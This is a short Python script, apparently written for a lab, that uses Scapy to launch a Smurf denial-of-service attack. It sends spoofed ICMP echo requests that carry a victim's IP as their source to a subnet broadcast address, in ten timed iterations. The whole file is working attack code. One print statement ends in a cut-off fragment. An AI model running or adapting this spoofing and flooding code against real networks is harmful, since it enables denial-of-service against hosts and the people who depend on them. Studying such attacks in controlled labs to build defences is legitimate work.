import time
from scapy.all import IP, ICMP, send

def smurf_attack():
    victim_ip = "172.18.7.40"

    broadcast_ip = "172.18.7.255"

    print(f"[*] Launching Smurf Attack...")
    print(f"[*] Target/Victim IP: {victim_ip}")
    print(f"[*] Broadcast Address: {broadcast_ip}\n")

    for i in range(10):
        packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()
        send(packet, verbose=False)

        print(f"[Iteration {i+1}/10] Sent spoofed ICMP Echo Request -> Src: {victim_ip} | D>")

        time.sleep(1)

    print("\n[*] Completed 10 iterations of the Smurf attack sequence.")

if __name__ == "__main__":
    smurf_attack()